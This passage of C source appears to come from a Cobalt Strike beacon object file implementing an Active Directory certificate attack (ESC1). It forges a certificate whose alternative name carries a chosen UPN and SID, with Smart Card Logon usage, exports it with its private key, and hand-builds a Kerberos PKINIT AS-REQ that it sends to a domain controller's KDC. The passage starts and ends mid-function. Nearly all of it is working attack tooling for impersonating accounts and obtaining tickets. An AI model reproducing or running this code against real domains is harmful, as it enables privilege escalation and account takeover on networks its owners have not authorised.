        MultiByteToWideChar(CP_UTF8, 0, szSidUrl, -1, wszSidUrl, 256);

        altNameEntries[1].dwAltNameChoice = CERT_ALT_NAME_URL;
        altNameEntries[1].pwszURL = wszSidUrl;
        dwAltNameCount = 2;
    }

    altNameInfo.cAltEntry = dwAltNameCount;
    altNameInfo.rgAltEntry = altNameEntries;

    if (!CryptEncodeObjectEx(X509_ASN_ENCODING, szOID_SUBJECT_ALT_NAME2, &altNameInfo,
                             CRYPT_ENCODE_ALLOC_FLAG, NULL, &pbEncodedSAN, &cbEncodedSAN)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to encode SAN: 0x%08X", GetLastError());
        free(pbSubject);
        free(pbEncodedUPN);
        return NULL;
    }

    extensions[extCount].pszObjId = (LPSTR)szOID_SUBJECT_ALT_NAME2;
    extensions[extCount].fCritical = FALSE;
    extensions[extCount].Value.cbData = cbEncodedSAN;
    extensions[extCount].Value.pbData = pbEncodedSAN;
    extCount++;

    /* Build EKU extension */
    ekuOids[0] = (LPSTR)"1.3.6.1.5.5.7.3.2";       /* Client Authentication */
    ekuOids[1] = (LPSTR)"1.3.6.1.4.1.311.20.2.2"; /* Smart Card Logon */
    eku.cUsageIdentifier = 2;
    eku.rgpszUsageIdentifier = ekuOids;

    if (CryptEncodeObjectEx(X509_ASN_ENCODING, X509_ENHANCED_KEY_USAGE, &eku,
                            CRYPT_ENCODE_ALLOC_FLAG, NULL, &pbEncodedEKU, &cbEncodedEKU)) {
        extensions[extCount].pszObjId = (LPSTR)szOID_ENHANCED_KEY_USAGE;
        extensions[extCount].fCritical = FALSE;
        extensions[extCount].Value.cbData = cbEncodedEKU;
        extensions[extCount].Value.pbData = pbEncodedEKU;
        extCount++;
    }

    /* Get public key info */
    CryptExportPublicKeyInfo(hProv, AT_KEYEXCHANGE, X509_ASN_ENCODING, NULL, &dwPubKeyInfoLen);
    pPubKeyInfo = (CERT_PUBLIC_KEY_INFO*)malloc(dwPubKeyInfoLen);
    if (!CryptExportPublicKeyInfo(hProv, AT_KEYEXCHANGE, X509_ASN_ENCODING, pPubKeyInfo, &dwPubKeyInfoLen)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] CryptExportPublicKeyInfo failed");
        goto cleanup;
    }

    /* Build certificate info */
    GetSystemTime(&stNow);
    stExpire = stNow;
    stExpire.wYear += 1;

    certInfo.dwVersion = CERT_V3;
    certInfo.SerialNumber.cbData = 16;
    certInfo.SerialNumber.pbData = (BYTE*)malloc(16);
    CryptGenRandom(hProv, 16, certInfo.SerialNumber.pbData);

    sigAlgo.pszObjId = (LPSTR)szOID_RSA_SHA256RSA;
    certInfo.SignatureAlgorithm = sigAlgo;

    certInfo.Issuer.cbData = cbSubject;
    certInfo.Issuer.pbData = pbSubject;

    SystemTimeToFileTime(&stNow, &certInfo.NotBefore);
    SystemTimeToFileTime(&stExpire, &certInfo.NotAfter);

    certInfo.Subject.cbData = cbSubject;
    certInfo.Subject.pbData = pbSubject;

    certInfo.SubjectPublicKeyInfo = *pPubKeyInfo;

    certInfo.cExtension = extCount;
    certInfo.rgExtension = extensions;

    /* Sign and encode certificate */
    if (!CryptSignAndEncodeCertificate(hProv, AT_KEYEXCHANGE, X509_ASN_ENCODING,
                                        X509_CERT_TO_BE_SIGNED, &certInfo, &sigAlgo,
                                        NULL, NULL, &cbEncodedCert)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] CryptSignAndEncodeCertificate size failed: 0x%08X", GetLastError());
        goto cleanup;
    }

    pbEncodedCert = (BYTE*)malloc(cbEncodedCert);
    if (!CryptSignAndEncodeCertificate(hProv, AT_KEYEXCHANGE, X509_ASN_ENCODING,
                                        X509_CERT_TO_BE_SIGNED, &certInfo, &sigAlgo,
                                        NULL, pbEncodedCert, &cbEncodedCert)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] CryptSignAndEncodeCertificate failed: 0x%08X", GetLastError());
        goto cleanup;
    }

    *certLen = cbEncodedCert;

    /* Create memory store and add certificate */
    hMemStore = CertOpenStore(CERT_STORE_PROV_MEMORY, 0, 0, CERT_STORE_CREATE_NEW_FLAG, NULL);
    if (!hMemStore) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] CertOpenStore failed");
        goto cleanup;
    }

    pCertContext = CertCreateCertificateContext(X509_ASN_ENCODING, pbEncodedCert, cbEncodedCert);
    if (!pCertContext) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] CertCreateCertificateContext failed");
        goto cleanup;
    }

    /* Add cert to store first, then associate private key with the store copy */
    {
        PCCERT_CONTEXT pStoreCert = NULL;
        if (!CertAddCertificateContextToStore(hMemStore, pCertContext, CERT_STORE_ADD_ALWAYS, &pStoreCert)) {
            BeaconPrintf(CALLBACK_OUTPUT, "[!] CertAddCertificateContextToStore failed");
            goto cleanup;
        }

        /* Associate private key with the container name we created */
        keyProvInfo.pwszContainerName = wszContainerName;  /* Use the container name from key generation */
        keyProvInfo.pwszProvName = MS_ENHANCED_PROV_W;
        keyProvInfo.dwProvType = PROV_RSA_FULL;
        keyProvInfo.dwFlags = 0;
        keyProvInfo.cProvParam = 0;
        keyProvInfo.rgProvParam = NULL;
        keyProvInfo.dwKeySpec = AT_KEYEXCHANGE;

        if (!CertSetCertificateContextProperty(pStoreCert, CERT_KEY_PROV_INFO_PROP_ID, 0, &keyProvInfo)) {
            BeaconPrintf(CALLBACK_OUTPUT, "[!] CertSetCertificateContextProperty failed: 0x%08X", GetLastError());
        }

        CertFreeCertificateContext(pStoreCert);
    }

    /* Export to PFX */
    pfxBlob.pbData = NULL;
    pfxBlob.cbData = 0;

    if (!PFXExportCertStoreEx(hMemStore, &pfxBlob, L"", NULL, EXPORT_PRIVATE_KEYS)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] PFXExportCertStoreEx size failed");
        goto cleanup;
    }

    pfxBlob.pbData = (BYTE*)malloc(pfxBlob.cbData);
    if (!PFXExportCertStoreEx(hMemStore, &pfxBlob, L"", NULL, EXPORT_PRIVATE_KEYS)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] PFXExportCertStoreEx failed");
        goto cleanup;
    }

    *pfxLen = pfxBlob.cbData;
    resultPfx = pfxBlob.pbData;

cleanup:
    if (certInfo.SerialNumber.pbData) free(certInfo.SerialNumber.pbData);
    if (pbSubject) free(pbSubject);
    if (pbEncodedUPN) free(pbEncodedUPN);
    if (pbEncodedSAN) LocalFree(pbEncodedSAN);
    if (pbEncodedEKU) LocalFree(pbEncodedEKU);
    if (pPubKeyInfo) free(pPubKeyInfo);
    if (pbEncodedCert && !resultPfx) free(pbEncodedCert);
    if (pCertContext) CertFreeCertificateContext(pCertContext);
    if (hMemStore) CertCloseStore(hMemStore, 0);
    /* Don't free keyProvInfo.pwszContainerName - it points to caller's buffer */

    return resultPfx;
}

/*
 * =============================================================================
 * PKINIT Implementation (from ESC1-unPAC)
 * =============================================================================
 */

/* Include PKINIT functions here - AS-REQ building, DH, etc. */
/* These are adapted from the ESC1-unPAC code */

static void GenerateDHKeys(HCRYPTPROV hProv) {
    BigInt p, g, x, y;
    if (!CryptGenRandom(hProv, sizeof(g_dhPrivateKey), g_dhPrivateKey)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] CryptGenRandom failed: 0x%08X", GetLastError());
    }
    g_dhPrivateKey[0] &= 0x7F;
    bigint_from_bytes(&p, DH_P_MODP2, sizeof(DH_P_MODP2));
    bigint_from_bytes(&g, DH_G_MODP2, sizeof(DH_G_MODP2));
    bigint_from_bytes(&x, g_dhPrivateKey, sizeof(g_dhPrivateKey));
    bigint_modpow(&y, &g, &x, &p);
    bigint_to_bytes(&y, g_dhPublicKey, sizeof(g_dhPublicKey));
}

/* Build PrincipalName structure */
static BYTE* BuildPrincipalName(int nameType, const char* name1, const char* name2, int* outLen) {
    int offset = 0;
    BYTE* content = (BYTE*)malloc(1024);
    BYTE* nameStrings = (BYTE*)malloc(512);
    int nameStringsLen = 0;
    int nameTypeLen, nameTypeTagLen, str1Len, nameStrSeqLen, nameStrTagLen;
    BYTE* nameTypeInt;
    BYTE* nameTypeTag;
    BYTE* str1;
    BYTE* nameStrSeq;
    BYTE* nameStrTag;
    BYTE* result;

    nameTypeInt = BuildInteger(nameType, &nameTypeLen);
    nameTypeTag = BuildContextTag(0, nameTypeInt, nameTypeLen, &nameTypeTagLen);
    memcpy(content + offset, nameTypeTag, nameTypeTagLen);
    offset += nameTypeTagLen;
    free(nameTypeInt);
    free(nameTypeTag);

    str1 = BuildGeneralString(name1, &str1Len);
    memcpy(nameStrings + nameStringsLen, str1, str1Len);
    nameStringsLen += str1Len;
    free(str1);

    if (name2 != NULL) {
        int str2Len;
        BYTE* str2 = BuildGeneralString(name2, &str2Len);
        memcpy(nameStrings + nameStringsLen, str2, str2Len);
        nameStringsLen += str2Len;
        free(str2);
    }

    nameStrSeq = BuildSequence(nameStrings, nameStringsLen, &nameStrSeqLen);
    nameStrTag = BuildContextTag(1, nameStrSeq, nameStrSeqLen, &nameStrTagLen);
    memcpy(content + offset, nameStrTag, nameStrTagLen);
    offset += nameStrTagLen;
    free(nameStrSeq);
    free(nameStrTag);
    free(nameStrings);

    result = BuildSequence(content, offset, outLen);
    free(content);
    return result;
}

/* Build KDC-REQ-BODY */
static BYTE* BuildKdcReqBody(const char* user, const char* realm, int* outLen) {
    BYTE* content = (BYTE*)malloc(4096);
    int offset = 0;
    SYSTEMTIME st;
    char tillTime[20];
    BYTE etypesContent[32];
    int etypesContentLen = 0;

    /* kdc-options [0] BIT STRING */
    BYTE kdcOptions[] = { 0x03, 0x05, 0x00, 0x40, 0x81, 0x00, 0x10 };
    int kdcOptsTagLen;
    BYTE* kdcOptsTag = BuildContextTag(0, kdcOptions, sizeof(kdcOptions), &kdcOptsTagLen);
    memcpy(content + offset, kdcOptsTag, kdcOptsTagLen);
    offset += kdcOptsTagLen;
    free(kdcOptsTag);

    /* cname [1] */
    int cnameLen, cnameTagLen;
    BYTE* cname = BuildPrincipalName(1, user, NULL, &cnameLen);
    BYTE* cnameTag = BuildContextTag(1, cname, cnameLen, &cnameTagLen);
    memcpy(content + offset, cnameTag, cnameTagLen);
    offset += cnameTagLen;
    free(cname);
    free(cnameTag);

    /* realm [2] */
    int realmStrLen, realmTagLen;
    BYTE* realmStr = BuildGeneralString(realm, &realmStrLen);
    BYTE* realmTag = BuildContextTag(2, realmStr, realmStrLen, &realmTagLen);
    memcpy(content + offset, realmTag, realmTagLen);
    offset += realmTagLen;
    free(realmStr);
    free(realmTag);

    /* sname [3] - krbtgt/REALM */
    int snameLen, snameTagLen;
    BYTE* sname = BuildPrincipalName(2, "krbtgt", realm, &snameLen);
    BYTE* snameTag = BuildContextTag(3, sname, snameLen, &snameTagLen);
    memcpy(content + offset, snameTag, snameTagLen);
    offset += snameTagLen;
    free(sname);
    free(snameTag);

    /* till [5] */
    GetSystemTime(&st);
    sprintf(tillTime, "%04d%02d%02d%02d%02d%02dZ", st.wYear + 1, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
    int tillStrLen, tillTagLen;
    BYTE* tillStr = BuildGeneralizedTime(tillTime, &tillStrLen);
    BYTE* tillTag = BuildContextTag(5, tillStr, tillStrLen, &tillTagLen);
    memcpy(content + offset, tillTag, tillTagLen);
    offset += tillTagLen;
    free(tillStr);
    free(tillTag);

    /* nonce [7] */
    srand((unsigned int)time(NULL));
    g_nonce = 100000000 + (rand() % 899999999);
    int nonceLen, nonceTagLen;
    BYTE* nonceInt = BuildInteger(g_nonce, &nonceLen);
    BYTE* nonceTag = BuildContextTag(7, nonceInt, nonceLen, &nonceTagLen);
    memcpy(content + offset, nonceTag, nonceTagLen);
    offset += nonceTagLen;
    free(nonceInt);
    free(nonceTag);

    /* etype [8] */
    int etypeLen;
    BYTE* etype1 = BuildInteger(ETYPE_AES256_CTS_HMAC_SHA1, &etypeLen);
    memcpy(etypesContent + etypesContentLen, etype1, etypeLen);
    etypesContentLen += etypeLen;
    free(etype1);

    BYTE* etype2 = BuildInteger(ETYPE_AES128_CTS_HMAC_SHA1, &etypeLen);
    memcpy(etypesContent + etypesContentLen, etype2, etypeLen);
    etypesContentLen += etypeLen;
    free(etype2);

    BYTE* etype3 = BuildInteger(ETYPE_RC4_HMAC, &etypeLen);
    memcpy(etypesContent + etypesContentLen, etype3, etypeLen);
    etypesContentLen += etypeLen;
    free(etype3);

    int etypesSeqLen, etypesTagLen;
    BYTE* etypesSeq = BuildSequence(etypesContent, etypesContentLen, &etypesSeqLen);
    BYTE* etypesTag = BuildContextTag(8, etypesSeq, etypesSeqLen, &etypesTagLen);
    memcpy(content + offset, etypesTag, etypesTagLen);
    offset += etypesTagLen;
    free(etypesSeq);
    free(etypesTag);

    BYTE* result = BuildSequence(content, offset, outLen);
    free(content);
    return result;
}

/*
 * =============================================================================
 * PKINIT - PKAuthenticator Construction
 * =============================================================================
 */

static BYTE* BuildPKAuthenticator(const char* user, const char* realm,
                                  BYTE* paChecksum, int paChecksumLen, int* outLen) {
    BYTE* content = (BYTE*)malloc(1024);
    int offset = 0;
    SYSTEMTIME st;
    char cusecTime[24];
    int cusecLen, cusecTagLen, ctimeLen, ctimeTagLen, nonceLen, nonceTagLen, paChecksumOctetLen, paChecksumTagLen;
    BYTE* cusecInt;
    BYTE* cusecTag;
    BYTE* ctimeStr;
    BYTE* ctimeTag;
    BYTE* nonceInt;
    BYTE* nonceTag;
    BYTE* paChecksumOctet;
    BYTE* paChecksumTag;
    BYTE* result;

    /* cusec [0] INTEGER (microseconds) */
    GetSystemTime(&st);
    cusecInt = BuildInteger(st.wMilliseconds * 1000, &cusecLen);
    cusecTag = BuildContextTag(0, cusecInt, cusecLen, &cusecTagLen);
    memcpy(content + offset, cusecTag, cusecTagLen);
    offset += cusecTagLen;
    free(cusecInt);
    free(cusecTag);

    /* ctime [1] GeneralizedTime */
    sprintf(cusecTime, "%04d%02d%02d%02d%02d%02dZ", st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
    ctimeStr = BuildGeneralizedTime(cusecTime, &ctimeLen);
    ctimeTag = BuildContextTag(1, ctimeStr, ctimeLen, &ctimeTagLen);
    memcpy(content + offset, ctimeTag, ctimeTagLen);
    offset += ctimeTagLen;
    free(ctimeStr);
    free(ctimeTag);

    /* nonce [2] INTEGER */
    nonceInt = BuildInteger(g_nonce, &nonceLen);
    nonceTag = BuildContextTag(2, nonceInt, nonceLen, &nonceTagLen);
    memcpy(content + offset, nonceTag, nonceTagLen);
    offset += nonceTagLen;
    free(nonceInt);
    free(nonceTag);

    /* paChecksum [3] OCTET STRING (SHA1 of req-body) */
    paChecksumOctet = BuildOctetString(paChecksum, paChecksumLen, &paChecksumOctetLen);
    paChecksumTag = BuildContextTag(3, paChecksumOctet, paChecksumOctetLen, &paChecksumTagLen);
    memcpy(content + offset, paChecksumTag, paChecksumTagLen);
    offset += paChecksumTagLen;
    free(paChecksumOctet);
    free(paChecksumTag);

    result = BuildSequence(content, offset, outLen);
    free(content);
    return result;
}

/*
 * =============================================================================
 * PKINIT - DH SubjectPublicKeyInfo
 * =============================================================================
 */

static BYTE* BuildDhSubjectPublicKeyInfo(int* outLen) {
    BYTE* content = (BYTE*)malloc(1024);
    BYTE* domainParamsContent = (BYTE*)malloc(256);
    BYTE* algIdContent = (BYTE*)malloc(512);
    int offset = 0;
    int pIntLen, gIntLen, domainParamsLen, algIdLen, pubKeyIntLen, pubKeyBitLen;
    BYTE* pInt;
    BYTE* gInt;
    BYTE* domainParams;
    BYTE* algId;
    BYTE* pubKeyInt;
    BYTE* pubKeyBit;
    BYTE* result;

    /* OID: 1.2.840.10046.2.1 (dhpublicnumber) */
    BYTE dhOid[] = { 0x06, 0x07, 0x2A, 0x86, 0x48, 0xCE, 0x3E, 0x02, 0x01 };

    pInt = BuildIntegerFromBytes((BYTE*)DH_P_MODP2, sizeof(DH_P_MODP2), &pIntLen);
    gInt = BuildIntegerFromBytes((BYTE*)DH_G_MODP2, sizeof(DH_G_MODP2), &gIntLen);

    memcpy(domainParamsContent, pInt, pIntLen);
    memcpy(domainParamsContent + pIntLen, gInt, gIntLen);
    domainParams = BuildSequence(domainParamsContent, pIntLen + gIntLen, &domainParamsLen);
    free(pInt);
    free(gInt);

    memcpy(algIdContent, dhOid, sizeof(dhOid));
    memcpy(algIdContent + sizeof(dhOid), domainParams, domainParamsLen);
    algId = BuildSequence(algIdContent, sizeof(dhOid) + domainParamsLen, &algIdLen);
    free(domainParams);

    memcpy(content + offset, algId, algIdLen);
    offset += algIdLen;
    free(algId);

    pubKeyInt = BuildIntegerFromBytes(g_dhPublicKey, sizeof(g_dhPublicKey), &pubKeyIntLen);
    pubKeyBit = BuildBitString(pubKeyInt, pubKeyIntLen, &pubKeyBitLen);
    memcpy(content + offset, pubKeyBit, pubKeyBitLen);
    offset += pubKeyBitLen;
    free(pubKeyInt);
    free(pubKeyBit);

    result = BuildSequence(content, offset, outLen);
    free(content);
    free(domainParamsContent);
    free(algIdContent);
    return result;
}

/*
 * =============================================================================
 * PKINIT - AuthPack Construction
 * =============================================================================
 */

static BYTE* BuildAuthPack(const char* user, const char* realm,
                           BYTE* paChecksum, int paChecksumLen, int* outLen) {
    BYTE* content = (BYTE*)malloc(2048);
    int offset = 0;
    int pkAuthLen, pkAuthTagLen, dhPubKeyInfoLen, dhPubKeyTagLen;
    BYTE* pkAuth;
    BYTE* pkAuthTag;
    BYTE* dhPubKeyInfo;
    BYTE* dhPubKeyTag;
    BYTE* result;

    /* pkAuthenticator [0] PKAuthenticator */
    pkAuth = BuildPKAuthenticator(user, realm, paChecksum, paChecksumLen, &pkAuthLen);
    pkAuthTag = BuildContextTag(0, pkAuth, pkAuthLen, &pkAuthTagLen);
    memcpy(content + offset, pkAuthTag, pkAuthTagLen);
    offset += pkAuthTagLen;
    free(pkAuth);
    free(pkAuthTag);

    /* clientPublicValue [1] SubjectPublicKeyInfo (for DH) */
    dhPubKeyInfo = BuildDhSubjectPublicKeyInfo(&dhPubKeyInfoLen);
    dhPubKeyTag = BuildContextTag(1, dhPubKeyInfo, dhPubKeyInfoLen, &dhPubKeyTagLen);
    memcpy(content + offset, dhPubKeyTag, dhPubKeyTagLen);
    offset += dhPubKeyTagLen;
    free(dhPubKeyInfo);
    free(dhPubKeyTag);

    result = BuildSequence(content, offset, outLen);
    free(content);
    return result;
}

/*
 * =============================================================================
 * PKINIT - CMS SignedData Construction
 * =============================================================================
 */

static BYTE* BuildCmsSignedData(PCCERT_CONTEXT pCert, BYTE* content, int contentLen, int* outLen) {
    #define szOID_PKINIT_AUTHDATA_STR "1.3.6.1.5.2.3.1"

    HCRYPTPROV hProv = 0;
    DWORD keySpec = 0;
    BOOL fCallerFree = FALSE;
    HCRYPTMSG hMsg = NULL;
    BYTE* signedMsg = NULL;
    DWORD signedMsgLen = 0;
    CMSG_SIGNER_ENCODE_INFO signerInfo;
    CMSG_SIGNED_ENCODE_INFO signedInfo;
    CERT_BLOB certBlob;

    *outLen = 0;

    if (!CryptAcquireCertificatePrivateKey(pCert, CRYPT_ACQUIRE_USE_PROV_INFO_FLAG,
                                           NULL, &hProv, &keySpec, &fCallerFree)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to acquire private key: 0x%08X", GetLastError());
        return NULL;
    }

    memset(&signerInfo, 0, sizeof(signerInfo));
    signerInfo.cbSize = sizeof(signerInfo);
    signerInfo.pCertInfo = pCert->pCertInfo;
    signerInfo.hCryptProv = hProv;
    signerInfo.dwKeySpec = keySpec;
    signerInfo.HashAlgorithm.pszObjId = (LPSTR)szOID_RSA_SHA1RSA;

    certBlob.cbData = pCert->cbCertEncoded;
    certBlob.pbData = pCert->pbCertEncoded;

    memset(&signedInfo, 0, sizeof(signedInfo));
    signedInfo.cbSize = sizeof(signedInfo);
    signedInfo.cSigners = 1;
    signedInfo.rgSigners = &signerInfo;
    signedInfo.cCertEncoded = 1;
    signedInfo.rgCertEncoded = &certBlob;

    hMsg = CryptMsgOpenToEncode(
        PKCS_7_ASN_ENCODING | X509_ASN_ENCODING,
        0,
        CMSG_SIGNED,
        &signedInfo,
        szOID_PKINIT_AUTHDATA_STR,
        NULL
    );

    if (!hMsg) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] CryptMsgOpenToEncode failed: 0x%08X", GetLastError());
        goto cleanup;
    }

    if (!CryptMsgUpdate(hMsg, content, contentLen, TRUE)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] CryptMsgUpdate failed: 0x%08X", GetLastError());
        goto cleanup;
    }

    if (!CryptMsgGetParam(hMsg, CMSG_CONTENT_PARAM, 0, NULL, &signedMsgLen)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] CryptMsgGetParam size failed: 0x%08X", GetLastError());
        goto cleanup;
    }

    signedMsg = (BYTE*)malloc(signedMsgLen);
    if (!CryptMsgGetParam(hMsg, CMSG_CONTENT_PARAM, 0, signedMsg, &signedMsgLen)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] CryptMsgGetParam failed: 0x%08X", GetLastError());
        free(signedMsg);
        signedMsg = NULL;
        goto cleanup;
    }

    *outLen = signedMsgLen;

cleanup:
    if (hMsg) CryptMsgClose(hMsg);
    if (fCallerFree && hProv) CryptReleaseContext(hProv, 0);
    return signedMsg;
}

/*
 * =============================================================================
 * PKINIT - PA-PK-AS-REQ Construction
 * =============================================================================
 */

static BYTE* BuildPaPkAsReq(PCCERT_CONTEXT pCert, BYTE* authPack, int authPackLen, int* outLen) {
    int signedDataLen;
    BYTE* signedData;
    BYTE* content;
    int offset = 0;
    int lenSize;
    BYTE* result;

    signedData = BuildCmsSignedData(pCert, authPack, authPackLen, &signedDataLen);
    if (signedData == NULL) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to build CMS SignedData");
        return NULL;
    }

    content = (BYTE*)malloc(8192);

    /* [0] IMPLICIT - use context tag 0x80 for primitive */
    content[offset++] = 0x80;
    lenSize = EncodeLength(content + offset, signedDataLen);
    offset += lenSize;
    memcpy(content + offset, signedData, signedDataLen);
    offset += signedDataLen;
    free(signedData);

    result = BuildSequence(content, offset, outLen);
    free(content);
    return result;
}

/*
 * =============================================================================
 * PKINIT - Full AS-REQ Construction
 * =============================================================================
 */

static BYTE* BuildPkinitAsReq(PCCERT_CONTEXT pCert, const char* user, const char* domain, int* outLen) {
    char* realm = (char*)malloc(256);
    BYTE* padataContent = (BYTE*)malloc(8192);
    BYTE* asReqContent = (BYTE*)malloc(16384);
    BYTE* result = NULL;
    int i;
    int reqBodyLen, authPackLen, paPkAsReqLen, padataOffset, padataSeqLen, asReqOffset;
    int paTypeLen, paTypeTagLen, paValueOctetLen, paValueTagLen;
    int pvnoLen, pvnoTagLen, msgTypeLen, msgTypeTagLen;
    int padataOuterSeqLen, padataOuterTagLen, reqBodyTagLen, asReqSeqLen;
    BYTE* reqBody;
    BYTE* authPack;
    BYTE* paPkAsReq;
    BYTE* paTypeInt;
    BYTE* paTypeTag;
    BYTE* paValueOctet;
    BYTE* paValueTag;
    BYTE* padataSeq;
    BYTE* pvnoInt;
    BYTE* pvnoTag;
    BYTE* msgTypeInt;
    BYTE* msgTypeTag;
    BYTE* padataOuterSeq;
    BYTE* padataOuterTag;
    BYTE* reqBodyTag;
    BYTE* asReqSeq;
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    BYTE paChecksum[20];
    DWORD hashLen = 20;

    /* Convert domain to uppercase for realm */
    for (i = 0; domain[i] && i < 255; i++) {
        realm[i] = (domain[i] >= 'a' && domain[i] <= 'z') ? domain[i] - 32 : domain[i];
    }
    realm[i] = '\0';

    /* Build req-body first (needed for paChecksum) */
    reqBody = BuildKdcReqBody(user, realm, &reqBodyLen);

    /* Calculate SHA-1 of req-body for paChecksum */
    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] CryptAcquireContext failed");
        free(reqBody);
        goto cleanup;
    }

    /* Generate DH keys */
    GenerateDHKeys(hProv);

    CryptCreateHash(hProv, CALG_SHA1, 0, 0, &hHash);
    CryptHashData(hHash, reqBody, reqBodyLen, 0);
    CryptGetHashParam(hHash, HP_HASHVAL, paChecksum, &hashLen, 0);
    CryptDestroyHash(hHash);
    CryptReleaseContext(hProv, 0);

    /* Build AuthPack */
    authPack = BuildAuthPack(user, realm, paChecksum, 20, &authPackLen);

    /* Build PA-PK-AS-REQ */
    paPkAsReq = BuildPaPkAsReq(pCert, authPack, authPackLen, &paPkAsReqLen);
    free(authPack);

    if (paPkAsReq == NULL) {
        free(reqBody);
        goto cleanup;
    }

    /* Build PA-DATA for PKINIT */
    padataOffset = 0;

    /* padata-type [1] INTEGER (16 = PA-PK-AS-REQ) */
    paTypeInt = BuildInteger(PA_PK_AS_REQ, &paTypeLen);
    paTypeTag = BuildContextTag(1, paTypeInt, paTypeLen, &paTypeTagLen);
    memcpy(padataContent + padataOffset, paTypeTag, paTypeTagLen);
    padataOffset += paTypeTagLen;
    free(paTypeInt);
    free(paTypeTag);

    /* padata-value [2] OCTET STRING */
    paValueOctet = BuildOctetString(paPkAsReq, paPkAsReqLen, &paValueOctetLen);
    paValueTag = BuildContextTag(2, paValueOctet, paValueOctetLen, &paValueTagLen);
    memcpy(padataContent + padataOffset, paValueTag, paValueTagLen);
    padataOffset += paValueTagLen;
    free(paValueOctet);
    free(paValueTag);
    free(paPkAsReq);

    padataSeq = BuildSequence(padataContent, padataOffset, &padataSeqLen);

    /* Build AS-REQ */
    asReqOffset = 0;

    /* pvno [1] INTEGER (5) */
    pvnoInt = BuildInteger(5, &pvnoLen);
    pvnoTag = BuildContextTag(1, pvnoInt, pvnoLen, &pvnoTagLen);
    memcpy(asReqContent + asReqOffset, pvnoTag, pvnoTagLen);
    asReqOffset += pvnoTagLen;
    free(pvnoInt);
    free(pvnoTag);

    /* msg-type [2] INTEGER (10 = AS-REQ) */
    msgTypeInt = BuildInteger(KRB_AS_REQ, &msgTypeLen);
    msgTypeTag = BuildContextTag(2, msgTypeInt, msgTypeLen, &msgTypeTagLen);
    memcpy(asReqContent + asReqOffset, msgTypeTag, msgTypeTagLen);
    asReqOffset += msgTypeTagLen;
    free(msgTypeInt);
    free(msgTypeTag);

    /* padata [3] SEQUENCE OF PA-DATA */
    padataOuterSeq = BuildSequence(padataSeq, padataSeqLen, &padataOuterSeqLen);
    padataOuterTag = BuildContextTag(3, padataOuterSeq, padataOuterSeqLen, &padataOuterTagLen);
    memcpy(asReqContent + asReqOffset, padataOuterTag, padataOuterTagLen);
    asReqOffset += padataOuterTagLen;
    free(padataSeq);
    free(padataOuterSeq);
    free(padataOuterTag);

    /* req-body [4] KDC-REQ-BODY */
    reqBodyTag = BuildContextTag(4, reqBody, reqBodyLen, &reqBodyTagLen);
    memcpy(asReqContent + asReqOffset, reqBodyTag, reqBodyTagLen);
    asReqOffset += reqBodyTagLen;
    free(reqBody);
    free(reqBodyTag);

    /* Wrap in SEQUENCE */
    asReqSeq = BuildSequence(asReqContent, asReqOffset, &asReqSeqLen);

    /* Wrap in APPLICATION 10 (AS-REQ) */
    result = BuildApplication(KRB_AS_REQ, asReqSeq, asReqSeqLen, outLen);
    free(asReqSeq);

cleanup:
    free(realm);
    free(padataContent);
    free(asReqContent);
    return result;
}

/*
 * =============================================================================
 * Network - Send to KDC
 * =============================================================================
 */

static BYTE* SendToKdc(const char* kdcHost, int port, BYTE* data, int dataLen, int* respLen) {
    WSADATA wsaData;
    SOCKET sock = INVALID_SOCKET;
    struct sockaddr_in server;
    struct hostent* host;
    BYTE* response = NULL;
    BYTE lengthPrefix[4];
    DWORD totalLen;

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] WSAStartup failed");
        return NULL;
    }

    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Socket creation failed");
        WSACleanup();
        return NULL;
    }

    host = gethostbyname(kdcHost);
    if (!host) {
        server.sin_addr.s_addr = inet_addr(kdcHost);
        if (server.sin_addr.s_addr == INADDR_NONE) {
            BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to resolve %s", kdcHost);
            closesocket(sock);
            WSACleanup();
            return NULL;
        }
    } else {
        memcpy(&server.sin_addr, host->h_addr_list[0], host->h_length);
    }
    server.sin_family = AF_INET;
    server.sin_port = htons((unsigned short)port);

    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Connection to KDC failed");
        closesocket(sock);
        WSACleanup();
        return NULL;
    }

    /* Send with 4-byte length prefix (big-endian) */
    totalLen = htonl(dataLen);
    memcpy(lengthPrefix, &totalLen, 4);
    send(sock, (char*)lengthPrefix, 4, 0);
    send(sock, (char*)data, dataLen, 0);

    /* Receive response length */
    if (recv(sock, (char*)lengthPrefix, 4, 0) != 4) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to receive response length");
        closesocket(sock);
        WSACleanup();
        return NULL;
    }

    memcpy(&totalLen, lengthPrefix, 4);
    *respLen = ntohl(totalLen);

    if (*respLen <= 0 || *respLen > 100000) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Invalid response length: %d", *respLen);
        closesocket(sock);
        WSACleanup();
        return NULL;
    }

    response = (BYTE*)malloc(*respLen);
    int received = 0;
    while (received < *respLen) {
        int r = recv(sock, (char*)response + received, *respLen - received, 0);
        if (r <= 0) break;
        received += r;
    }

    closesocket(sock);
